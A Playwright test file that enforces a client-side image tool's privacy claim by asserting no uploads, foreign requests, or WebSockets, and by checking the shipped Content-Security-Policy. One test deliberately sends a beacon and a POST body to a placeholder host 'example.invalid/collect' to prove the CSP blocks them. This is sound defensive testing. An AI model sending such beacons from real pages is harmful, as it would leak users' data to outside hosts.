import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { expect, test } from './fixtures';
import { photoPng } from './fixture';

// The privacy claim ("nothing leaves your device") is enforced here, not just promised in the page copy.
// Keep this green forever: if a change makes it fail, the change is wrong, not the test.

test('no request carries image data, and none goes to a third-party host', async ({ page, seen }) => {
  await page.goto('/');
  await page.locator('#reduce-limit').fill('4');
  await page.locator('#reduce-limit').press('Enter');
  for (const effort of ['quick', 'best']) {
    await page.locator('#effort').selectOption(effort);
    await page.locator('#file').setInputFiles({ name: `photo-${effort}.png`, mimeType: 'image/png', buffer: photoPng(560, 420, effort === 'best') });
  }
  await expect(page.locator('#finished-list .card a[download]')).toHaveCount(2);

  const origin = new URL(page.url()).origin;
  const foreign = seen.filter((r) => !r.url.startsWith('blob:') && !r.url.startsWith('data:') && new URL(r.url).origin !== origin);
  expect(foreign, `requests to other hosts: ${foreign.map((r) => r.url).join(', ')}`).toEqual([]);

  const uploads = seen.filter((r) => r.method !== 'GET' && r.method !== 'HEAD');
  expect(uploads, 'the app must never send a non-GET request').toEqual([]);
  expect(seen.filter((r) => r.hasBody), 'the app must never send a request body').toEqual([]);
  expect(seen.length).toBeGreaterThan(3);
});

test('no WebSocket, beacon or worker-initiated network call exists', async ({ page }) => {
  const sockets: string[] = [];
  page.on('websocket', (ws) => sockets.push(ws.url()));
  await page.goto('/');
  await page.locator('#file').setInputFiles({ name: 'photo.png', mimeType: 'image/png', buffer: photoPng(320, 240) });
  await expect(page.locator('#finished-list .card a[download]')).toHaveCount(1);
  expect(sockets).toEqual([]);
  // Prove the policy is enforced, not just written: the browser itself must refuse a request to another host.
  const refusal = page.waitForEvent('console', { predicate: (m) => m.text().includes('example.invalid'), timeout: 10_000 });
  await page.evaluate(() => {
    navigator.sendBeacon('https://example.invalid/collect', 'x');
    void fetch('https://example.invalid/collect', { method: 'POST', body: 'x' }).catch(() => {});
  });
  expect((await refusal).text()).toMatch(/Content Security Policy|connect-src/i);
});

test('the shipped CSP forbids everything the privacy claim rules out', () => {
  const headers = readFileSync(resolve(import.meta.dirname, '../public/_headers'), 'utf8');
  const csp = /Content-Security-Policy:\s*(.+)/.exec(headers)?.[1] ?? '';
  for (const directive of ["default-src 'self'", "connect-src 'self'", "form-action 'none'", "object-src 'none'", "frame-ancestors 'none'"]) {
    expect(csp, directive).toContain(directive);
  }
  expect(csp).not.toMatch(/https?:\/\//);
  expect(csp).not.toContain("'unsafe-eval'");
  expect(csp).not.toContain("'unsafe-inline'");
});
